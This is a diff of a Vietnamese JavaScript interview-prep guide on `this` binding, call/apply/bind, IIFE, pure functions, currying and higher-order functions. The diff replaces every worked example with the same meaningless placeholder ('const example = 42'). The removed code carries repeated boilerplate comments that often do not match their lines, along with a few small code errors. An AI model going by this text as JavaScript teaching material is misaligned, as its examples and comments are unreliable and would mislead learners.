- // Chú giải: ═══════════════════════════════════════════════════════════
-// PROTOTYPE - Regular có prototype, Arrow không
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-function RegularFn() {}
-console.log(RegularFn.prototype); // Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
-
-const ArrowFn = () => {};
-console.log(ArrowFn.prototype); // Chú giải: ❌ undefined
-
-// Use case: Thêm methods vào prototype
-function Person(name: string) {
-  this.name = name;
-}
-
-Person.prototype.greet = function() {
-  return `Hello, I'm ${this.name}`;
-  // ✅ Phải dùng regular function để có this
-};
-
-const person = new Person('John');
-console.log(person.greet()); // Chú giải: "Hello, I'm John"
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -3509,248 +1338,30 @@ console.log(person.greet()); // Chú giải: "Hello, I'm John"
 
 #### **2.1. Understanding `this` Context**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
-// THIS CONTEXT - 4 quy tắc
- // Chú giải: ═══════════════════════════════════════════════════════════
-
- // Chú giải: 1️⃣ Default binding (strict mode: undefined, non-strict: window)
-function showThis() {
-  console.log(this);
-}
-showThis(); // window (non-strict) hoặc undefined (strict)
-
- // Chú giải: 2️⃣ Implicit binding (object gọi method)
-const obj = {
-  name: 'John',
-  greet() {
-    console.log(this.name); // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-  }
-};
-obj.greet();
-
- // Dùng `bind`, `call`, hoặc `apply` để thiết lập `this` rõ ràng khi cần.
-function greet() {
-  console.log(this.name);
-}
-const user = { name: 'Alice' };
-greet.call(user); // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-
- // Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
-function Person(name: string) {
-  this.name = name;
-}
-const p = new Person('Bob'); // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 #### **2.2. call() - Gọi ngay với arguments riêng lẻ**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh. Dùng `bind`, `call`, hoặc `apply` để thiết lập `this` rõ ràng khi cần.
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-function introduce(age: number, city: string): string {
-  return `I'm ${this.name}, ${age} years old, from ${city}`;
-}
-
-const person1 = { name: 'John' };
-const person2 = { name: 'Alice' };
-
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-console.log(introduce.call(person1, 25, 'HCM')); 
- // Chú giải: "I'm John, 25 years old, from HCM"
-
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-console.log(introduce.call(person2, 30, 'HN')); 
- // Chú giải: "I'm Alice, 30 years old, from HN"
-
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: Use case: Function borrowing
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-const car = {
-  brand: 'Toyota',
-  model: 'Camry',
-  getInfo() {
-    return `${this.brand} ${this.model}`;
-  }
-};
-
-const bike = { brand: 'Honda', model: 'CBR' };
-
- // Chú giải: "Mượn" method getInfo của car cho bike
-console.log(car.getInfo.call(bike)); 
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: Use case: Array-like to Array
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-function argsToArray() {
-  // arguments là array-like, không phải array
- // Chú giải: Mượn method slice của Array
-  const arr = Array.prototype.slice.call(arguments);
-  console.log(arr); // [1, 2, 3] - thành array thật ✅
-}
-
-argsToArray(1, 2, 3);
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 #### **2.3. apply() - Gọi ngay với array of arguments**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh. Dùng `bind`, `call`, hoặc `apply` để thiết lập `this` rõ ràng khi cần.
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-function introduce(age: number, city: string): string {
-  return `I'm ${this.name}, ${age} years old, from ${city}`;
-}
-
-const person = { name: 'John' };
-
-// apply - arguments là ARRAY
-const args = [25, 'HCM'];
-console.log(introduce.apply(person, args)); 
- // Chú giải: "I'm John, 25 years old, from HCM"
-
-// So sánh với call
-console.log(introduce.call(person, 25, 'HCM')); // Giống kết quả
-
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: Use case: Math.max với array
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-const numbers = [5, 6, 2, 3, 7, 1];
-
-// ❌ Math.max nhận arguments riêng lẻ, không nhận array
- // Chú giải: console.log(Math.max(numbers)); // NaN
-
-// ✅ Dùng apply để "spread" array thành arguments
-console.log(Math.max.apply(null, numbers)); // Chú giải: 7
-
-// Modern: Dùng spread operator (ES6+)
-console.log(Math.max(...numbers)); // 7 - dễ đọc hơn ✅
-
- // Chú giải: ═══════════════════════════════════════════════════════════
-// call vs apply - Khi nào dùng cái nào?
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-// call: Khi biết CHÍNH XÁC số lượng arguments
-fn.call(obj, arg1, arg2, arg3);
-
-// apply: Khi arguments là ARRAY hoặc ĐỘNG
-fn.apply(obj, argsArray);
-fn.apply(obj, [...dynamicArgs]);
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 #### **2.4. bind() - Tạo function mới với this cố định**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh. Dùng `bind`, `call`, hoặc `apply` để thiết lập `this` rõ ràng khi cần.
-// Trả về FUNCTION MỚI, KHÔNG gọi ngay!
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-function introduce(age: number, city: string): string {
-  return `I'm ${this.name}, ${age} years old, from ${city}`;
-}
-
-const person = { name: 'John' };
-
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh. Dùng `bind`, `call`, hoặc `apply` để thiết lập `this` rõ ràng khi cần.
-const boundIntroduce = introduce.bind(person);
-
- // Chú giải: Gọi function mới
-console.log(boundIntroduce(25, 'HCM')); 
- // Chú giải: "I'm John, 25 years old, from HCM"
-
-// this luôn luôn là person, không thay đổi được!
-const anotherPerson = { name: 'Alice' };
-console.log(boundIntroduce.call(anotherPerson, 30, 'HN')); 
- // Chú giải: "I'm John, 30, from HN"
-// ⚠️ Vẫn là "John", không phải "Alice"!
-// this đã bị "khóa cứng" = person
-
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: Use case 1: Event handlers
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-class Button {
-  constructor(public label: string) {}
-
-  // ❌ SAI: this sẽ mất khi làm event handler
-  handleClickWrong() {
-    console.log(this.label); // Chú giải: undefined khi click
-  }
-
-  // ✅ ĐÚNG: Bind this trong constructor
-  constructor(public label: string) {
-    this.handleClick = this.handleClick.bind(this);
-  }
-
-  handleClick() {
-    console.log(this.label); // Chú giải: ✅ Works!
-  }
-}
-
-const btn = new Button('Submit');
-document.addEventListener('click', btn.handleClick); 
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: Use case 2: Partial application (Currying)
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-function multiply(a: number, b: number, c: number): number {
-  return a * b * c;
-}
-
-// "Khóa" argument đầu tiên = 2
-const double = multiply.bind(null, 2); 
- // Chú giải: double = (b, c) => 2 * b * c
-
-console.log(double(3, 4)); // Chú giải: 2 * 3 * 4 = 24
-console.log(double(5, 6)); // Chú giải: 2 * 5 * 6 = 60
-
-// "Khóa" 2 arguments đầu
-const multiplyBy2And3 = multiply.bind(null, 2, 3);
- // Chú giải: multiplyBy2And3 = (c) => 2 * 3 * c
-
-console.log(multiplyBy2And3(4)); // Chú giải: 2 * 3 * 4 = 24
-
- // Chú giải: ═══════════════════════════════════════════════════════════
- // `setTimeout`/`setInterval` nằm trong macrotasks; nhớ clear khi không cần để tránh rò rỉ bộ nhớ.
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-class Timer {
-  constructor(public count: number = 0) {}
-
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh. `setTimeout`/`setInterval` nằm trong macrotasks; nhớ clear khi không cần để tránh rò rỉ bộ nhớ.
-  startWrong() {
-    setTimeout(function() {
-      this.count++; // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-      console.log(this.count);
-    }, 1000);
-  }
-
-  // ✅ ĐÚNG: Bind this
-  startBind() {
-    setTimeout(function() {
-      this.count++; // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-      console.log(this.count);
-    }.bind(this), 1000);
-  }
-
-  // ✅ ĐÚNG: Arrow function (khuyến nghị)
-  startArrow() {
-    setTimeout(() => {
-      this.count++; // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh. Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical.
-      console.log(this.count);
-    }, 1000);
-  }
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -3784,214 +1395,25 @@ class Timer {
 
 #### **4.1. Best Practices**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: ✅ BEST PRACTICES
- // Chú giải: ═══════════════════════════════════════════════════════════
-
- // Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical.
-const numbers = [1, 2, 3, 4, 5];
-const doubled = numbers.map(n => n * 2); // Chú giải: ✅ Clean
-
- // Chú giải: 2️⃣ Regular functions cho OBJECT METHODS
-const user = {
-  name: 'John',
-  greet() { // Chú giải: ✅ Shorthand method syntax
-    console.log(`Hello, ${this.name}`);
-  }
-};
-
-// 3️⃣ Arrow functions cho NESTED FUNCTIONS (tránh mất this)
-class Component {
-  data = [];
-  
-  fetchData() {
-    fetch('/api/data')
-      .then(response => response.json())
-      .then(data => {
-        this.data = data; // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh. Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical.
-      });
-  }
-}
-
- // Dùng `bind`, `call`, hoặc `apply` để thiết lập `this` rõ ràng khi cần. Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
-class Button {
-  constructor() {
-    this.handleClick = this.handleClick.bind(this); // Chú giải: ✅
-  }
-  
-  handleClick() {
-    console.log(this); // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-  }
-}
-
-// 5️⃣ Hoặc dùng CLASS FIELDS với arrow (modern)
-class ButtonModern {
-  handleClick = () => {
-    console.log(this); // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh. Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical.
-  }
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 #### **4.2. Common Mistakes**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: ❌ COMMON MISTAKES
- // Chú giải: ═══════════════════════════════════════════════════════════
-
- // Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical.
-const obj = {
-  name: 'John',
-  greet: () => {
-    console.log(this.name); // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-  }
-};
-
-// ✅ Fix: Dùng regular function hoặc method shorthand
-const obj = {
-  name: 'John',
-  greet() {
-    console.log(this.name); // Chú giải: ✅ "John"
-  }
-};
-
-// ❌ 2. Quên bind this cho event handlers
-class Component {
-  name = 'MyComponent';
-  
-  handleClick() {
-    console.log(this.name); // Chú giải: ❌ undefined
-  }
-  
-  componentDidMount() {
-    button.addEventListener('click', this.handleClick);
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-  }
-}
-
-// ✅ Fix: Bind hoặc arrow function
-class Component {
-  name = 'MyComponent';
-  
- // Dùng `bind`, `call`, hoặc `apply` để thiết lập `this` rõ ràng khi cần. Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
-  constructor() {
-    this.handleClick = this.handleClick.bind(this);
-  }
-  
-  handleClick() {
-    console.log(this.name); // Chú giải: ✅ "MyComponent"
-  }
-  
-  // Option 2: Arrow function (khuyến nghị)
-  handleClickArrow = () => {
-    console.log(this.name); // Chú giải: ✅ "MyComponent"
-  }
-}
-
-// ❌ 3. Dùng arguments trong arrow function
-const sum = (...numbers) => {
- // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
-  console.log(numbers); // ✅ Dùng rest parameters
-  return numbers.reduce((a, b) => a + b, 0);
-};
-
-// ❌ 4. Bind nhiều lần (không cần thiết)
-const fn = function() { console.log(this.name); };
-const obj = { name: 'John' };
-
-const bound1 = fn.bind(obj);
-const bound2 = bound1.bind({ name: 'Alice' });
-bound2(); // "John" - ❌ Bind chỉ có hiệu lực lần đầu!
-
- // Dùng `bind`, `call`, hoặc `apply` để thiết lập `this` rõ ràng khi cần.
-fn.call(obj); // Chú giải: ✅ Gọi NGAY
-fn.apply(obj); // Chú giải: ✅ Gọi NGAY
-fn.bind(obj);   // ❌ KHÔNG gọi, trả về function mới!
-fn.bind(obj)(); // ✅ Phải gọi thêm ()
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 ### **5. Real-World Examples**
 
-```typescript
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Chú giải: REACT COMPONENT
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-class TodoList extends React.Component {
-  state = {
-    todos: [],
-    newTodo: ''
-  };
-
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh. Dùng `bind`, `call`, hoặc `apply` để thiết lập `this` rõ ràng khi cần. Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical.
-  handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    this.setState({ newTodo: e.target.value });
-  }
-
- // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh. Dùng `bind`, `call`, hoặc `apply` để thiết lập `this` rõ ràng khi cần. Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical.
-  addTodo = () => {
-    this.setState(prev => ({
-      todos: [...prev.todos, prev.newTodo],
-      newTodo: ''
-    }));
-  }
-
- // Chú giải: ✅ Regular function OK cho lifecycle methods
-  componentDidMount() {
- // Chú giải: Fetch data...
-    fetch('/api/todos')
-      .then(res => res.json())
-      .then(todos => {
-        this.setState({ todos }); // Hàm mũi tên không có own `this` và không thể dùng làm constructor; thích hợp cho callback giữ `this` lexical.
-      });
-  }
-
-  render() {
-    return (
-      <div>
-        <input 
-          value={this.state.newTodo}
-          onChange={this.handleInputChange} // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh. Dùng `bind`, `call`, hoặc `apply` để thiết lập `this` rõ ràng khi cần.
-        />
-        <button onClick={this.addTodo}>Add</button>
-      </div>
-    );
-  }
-}
-
- // Chú giải: ═══════════════════════════════════════════════════════════
- // Dùng `bind`, `call`, hoặc `apply` để thiết lập `this` rõ ràng khi cần.
- // Chú giải: ═══════════════════════════════════════════════════════════
-
-function debounce<T extends (...args: any[]) => any>(
-  fn: T,
-  delay: number
-): (...args: Parameters<T>) => void {
-  let timeoutId: NodeJS.Timeout;
-
-  return function(this: any, ...args: Parameters<T>) {
-    clearTimeout(timeoutId);
-    
-    timeoutId = setTimeout(() => {
-      fn.apply(this, args); // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
-    }, delay);
-  };
-}
-
-class SearchBox {
-  searchTerm = '';
-
-  search(query: string) {
-    console.log(`Searching for: ${query}`);
-    console.log(`Current term: ${this.searchTerm}`);
-  }
-
- // Dùng `bind`, `call`, hoặc `apply` để thiết lập `this` rõ ràng khi cần.
-  debouncedSearch = debounce(this.search, 300).bind(this);
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -4018,13 +1440,14 @@ class SearchBox {
 **Remember:**
 > "Arrow function = lexical this (từ outer scope). Regular function = dynamic this (runtime). Dùng call/apply khi cần gọi ngay, bind khi cần function mới với this cố định!" 🎯
 ---
-## 10. 🎯 Q10: IIFE (Immediately Invoked Function Expression) & Functional Programming  
 
-**P1: Tên câu hỏi:** 🎯 Q10: IIFE (Immediately Invoked Function Expression) & Functional Programming  
+## 19. Q19: 🎯 Q10: IIFE (Immediately Invoked Function Expression) & Functional Programming
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🎯 Q10: IIFE (Immediately Invoked Function Expression) & Functional Programming
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 20. Q20: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
 
@@ -4064,9 +1487,6 @@ class SearchBox {
 - Currying vs Partial Application: Curry **luôn return unary** (1 param), Partial có thể nhiều params
 - Functional Programming giúp **avoid shared mutable state** → tránh race conditions trong async code
 
-
-
-
 **⚡ Quick Summary:**
 > IIFE = `(function(){})()` - chạy ngay, tạo scope riêng. FP = pure functions, immutability
 
@@ -4079,7 +1499,6 @@ class SearchBox {
 
 Giải thích IIFE, Pure Functions, Currying và Higher-Order Functions trong JavaScript. Bao gồm cách hoạt động, ưu nhược điểm và ứng dụng thực tế.
 
-
 ---
 
 **📚 Phần 1: IIFE (Immediately Invoked Function Expression)**
@@ -4090,84 +1509,23 @@ IIFE (đọc là "iffy") là một function được **gọi ngay lập tức** 
 
 **🔥 Cú Pháp:**
 
-```typescript
-// Cách 1: Bọc function trong ()
-(function () {
-  // Code ở đây chạy ngay lập tức
-})();
-
-// Cách 2: Bọc toàn bộ trong ()
-(function () {
-  // Code ở đây chạy ngay lập tức
-})();
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **💡 Tại Sao Cần IIFE?**
 
-```typescript
-// ❌ KHÔNG dùng IIFE - Biến x, y "rò rỉ" ra global scope
-let x = 10;
-let y = 20;
-console.log(window.x); // 10 - Ô nhiễm global scope! ❌
-
-// ✅ Dùng IIFE - Biến x, y KHÔNG rò rỉ
-(function () {
-  let x = 10; // Private variable - chỉ tồn tại trong scope này
-  let y = 20;
-  console.log(x + y); // Chú giải: 30
-})();
-
-console.log(typeof x); // "undefined" - x KHÔNG tồn tại bên ngoài ✅
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **🎯 Use Cases của IIFE:**
 
-```typescript
- // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
-const calculator = (function () {
-  let result = 0; // ⚠️ Private variable - không thể access từ bên ngoài
-
-  return {
-    add(x: number): number {
-      result += x; // Chỉ thay đổi được qua method này
-      return result;
-    },
-    subtract(x: number): number {
-      result -= x;
-      return result;
-    },
-    getResult(): number {
-      return result; // Chỉ đọc được qua method này
-    },
-  };
-})();
-
-calculator.add(10); // Chú giải: 10
-calculator.subtract(3); // Chú giải: 7
-console.log(calculator.result); // undefined - ❌ Không access được private variable
-console.log(calculator.getResult()); // 7 - ✅ Phải dùng method
-
-// 2️⃣ IIFE với Parameters - Truyền arguments vào
-(function (name: string, age: number) {
-  console.log(`Xin chào ${name}, ${age} tuổi`);
-})('John', 25); // "Xin chào John, 25 tuổi"
-
-// 3️⃣ IIFE với Return Value - Trả về kết quả
-const sum = (function (a: number, b: number): number {
-  return a + b; // Tính toán và trả về ngay lập tức
-})(5, 10);
-console.log(sum); // Chú giải: 15
-
-// 4️⃣ IIFE với Async/Await - Xử lý bất đồng bộ
-(async function () {
-  try {
-    const response = await fetch('/api/users');
-    const users = await response.json();
-    console.log(users);
-  } catch (error) {
-    console.error('Lỗi:', error);
-  }
-})();
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **✅ Ưu Điểm của IIFE:**
@@ -4184,7 +1542,6 @@ console.log(sum); // Chú giải: 15
 - ❌ **ES6 Modules tốt hơn**: Hiện nay dùng `import/export` thay thế
 
 ---
-
 
 **📚 Phần 2: Functional Programming - Pure Functions, Currying & HOF**
 
@@ -4207,34 +1564,9 @@ Pure function là hàm thỏa mãn 2 điều kiện:
 1. **Same Input → Same Output**: Cùng input luôn cho cùng output
 2. **No Side Effects**: Không thay đổi state bên ngoài (global variables, database, file, etc.)
 
-```typescript
-// ✅ Pure Function - Hoàn hảo!
-function add(a: number, b: number): number {
-  return a + b; // ✅ Chỉ tính toán, không side effects
-}
-
-console.log(add(2, 3)); // 5 - Gọi 1000 lần vẫn trả về 5
-console.log(add(2, 3)); // 5 - Predictable (dự đoán được)
-
-// ❌ Impure Function - Có side effects
-let counter = 0; // Chú giải: ⚠️ External state
-
-function increment(): number {
-  counter++; // ❌ Side effect - thay đổi biến bên ngoài
-  return counter;
-}
-
-console.log(increment()); // Chú giải: 1
-console.log(increment()); // 2 - ❌ Cùng input (không có), khác output!
-
-// ✅ Chuyển thành Pure Function
-function increment(counter: number): number {
-  return counter + 1; // ✅ Không thay đổi state, return giá trị mới
-}
-
-let myCounter = 0;
-myCounter = increment(myCounter); // 1 - Rõ ràng, dễ test
-myCounter = increment(myCounter); // Chú giải: 2
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **🎯 Ưu Điểm của Pure Functions:**
@@ -4252,51 +1584,16 @@ myCounter = increment(myCounter); // Chú giải: 2
 
 Currying là kỹ thuật **chuyển đổi** một function nhận **nhiều tham số** thành **chuỗi các functions**, mỗi function nhận **1 tham số**.
 
-```typescript
-// ❌ Function thông thường - Nhận tất cả tham số cùng lúc
-function add(a: number, b: number): number {
-  return a + b;
-}
-console.log(add(2, 3)); // 5 - Phải truyền cả 2 số
-
- // Chú giải: ✅ Currying - Nhận từng tham số một
-const add = (a: number) => (b: number) => a + b;
-//            ↑ nhận a    ↑ trả về function nhận b
-
-const add2 = add(2); // add2 là function: (b) => 2 + b
-console.log(add2(3)); // 5 - Giống kết quả trên
-console.log(add2(10)); // 12 - Có thể tái sử dụng add2
-console.log(add(2)(3)); // 5 - Hoặc gọi luôn
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **🎯 Use Cases của Currying:**
 
-```typescript
-// 1️⃣ Tạo specialized functions (hàm chuyên dụng)
-const multiply = (a: number) => (b: number) => a * b;
-
-const double = multiply(2); // Hàm nhân đôi
-const triple = multiply(3); // Hàm nhân ba
-
-console.log(double(5)); // 10 - double tái sử dụng được
-console.log(triple(5)); // Chú giải: 15
-
-// 2️⃣ Partial Application - Áp dụng một phần tham số
-const calculateTax = (rate: number) => (amount: number) => amount * rate;
-
-const calculateVAT = calculateTax(0.1); // Chú giải: VAT 10%
-const calculateLuxuryTax = calculateTax(0.2); // Chú giải: Luxury tax 20%
-
-console.log(calculateVAT(1000)); // Chú giải: 100 - 10% của 1000
-console.log(calculateLuxuryTax(1000)); // Chú giải: 200 - 20% của 1000
-
-// 3️⃣ Currying với nhiều tham số
-const volume = (length: number) => (width: number) => (height: number) =>
-  length * width * height;
-
-const boxVolume = volume(10)(5); // Chú giải: length=10, width=5, height=?
-console.log(boxVolume(2)); // Chú giải: 10 * 5 * 2 = 100
-console.log(boxVolume(3)); // Chú giải: 10 * 5 * 3 = 150
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -4310,77 +1607,16 @@ HOF là function thỏa mãn 1 trong 2 điều kiện:
 1. **Nhận function làm argument** (tham số)
 2. **Trả về function** (return function)
 
-```typescript
-// 1️⃣ HOF nhận function làm argument
-function withLogging<T extends (...args: any[]) => any>(
-  fn: T // ⚠️ Nhận function làm tham số
-): (...args: Parameters<T>) => ReturnType<T> {
-  return (...args: Parameters<T>) => {
-    console.log('🔍 Gọi function với:', args);
-    const result = fn(...args); // Chú giải: Gọi function gốc
-    console.log('✅ Kết quả:', result);
-    return result;
-  };
-}
-
-const add = (a: number, b: number) => a + b;
-const loggedAdd = withLogging(add); // Chú giải: Bọc add với logging
-
-loggedAdd(2, 3);
- // Chú giải: Output:
- // Chú giải: 🔍 Gọi function với: [2, 3]
-// ✅ Kết quả: 5
-
-// 2️⃣ HOF trả về function
-function createGreeter(greeting: string) {
-  return (name: string) => `${greeting}, ${name}!`; // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
-}
-
-const sayHello = createGreeter('Xin chào'); // Tạo function chào hỏi
-const sayHi = createGreeter('Hi'); // Tạo function chào hỏi khác
-
-console.log(sayHello('John')); // "Xin chào, John!"
-console.log(sayHi('Jane')); // Chú giải: "Hi, Jane!"
-
-// 3️⃣ Array methods đều là HOF
-const numbers = [1, 2, 3, 4, 5];
-
-const doubled = numbers.map((x) => x * 2); // Chú giải: [2, 4, 6, 8, 10]
-//                          ↑ nhận function làm argument
-
-const evens = numbers.filter((x) => x % 2 === 0); // Chú giải: [2, 4]
-//                           ↑ nhận function làm argument
-
-const sum = numbers.reduce((acc, x) => acc + x, 0); // Chú giải: 15
-//                         ↑ nhận function làm argument
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **🎯 Practical Example - Data Processing:**
 
-```typescript
-// Xử lý danh sách users
-const users = [
-  { name: 'John', age: 25, active: true },
-  { name: 'Jane', age: 30, active: false },
-  { name: 'Bob', age: 35, active: true },
-];
-
-// ❌ Cách cũ - Imperative (mệnh lệnh)
-const activeUserNames = [];
-for (let i = 0; i < users.length; i++) {
-  if (users[i].active) {
-    activeUserNames.push(users[i].name.toUpperCase());
-  }
-}
-activeUserNames.sort();
-
-// ✅ Cách mới - Functional Programming
-const activeUserNames2 = users
-  .filter((user) => user.active) // Chú giải: 1. Lọc user active
-  .map((user) => user.name.toUpperCase()) // 2. Chuyển tên thành UPPERCASE
-  .sort(); // 3. Sắp xếp
-
-console.log(activeUserNames2); // ['BOB', 'JOHN'] - Ngắn gọn, dễ đọc!
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -4395,40 +1631,9 @@ console.log(activeUserNames2); // ['BOB', 'JOHN'] - Ngắn gọn, dễ đọc!
 
 **❌ Common Mistakes:**
 
-```typescript
- // Chú giải: ❌ Sai: Impure function với side effects
-let total = 0;
-function addToTotal(value: number): void {
-  total += value; // ❌ Side effect - thay đổi biến global
-}
-
-// ✅ Đúng: Pure function
-function add(total: number, value: number): number {
-  return total + value; // ✅ Return giá trị mới, không thay đổi state
-}
-
-// ❌ Sai: Không dùng HOF khi có thể
-const numbers = [1, 2, 3, 4, 5];
-const doubled = [];
-for (let i = 0; i < numbers.length; i++) {
-  doubled.push(numbers[i] * 2); // ❌ Dài dòng, dễ lỗi
-}
-
-// ✅ Đúng: Dùng HOF
-const doubled2 = numbers.map((x) => x * 2); // ✅ Ngắn gọn, rõ ràng
-
-// ❌ Sai: Không dùng currying khi cần reuse
-function calculateTax(rate: number, amount: number): number {
-  return amount * rate;
-}
-const tax1 = calculateTax(0.1, 1000); // ❌ Lặp lại rate nhiều lần
-const tax2 = calculateTax(0.1, 2000);
-
-// ✅ Đúng: Dùng currying
-const calculateTax2 = (rate: number) => (amount: number) => amount * rate;
-const calculateVAT = calculateTax2(0.1); // ✅ Tạo function với rate cố định
-const tax3 = calculateVAT(1000); // Gọn hơn, tái sử dụng được
-const tax4 = calculateVAT(2000);
+```js
+// Ví dụ rút gọn
+const example = 42;
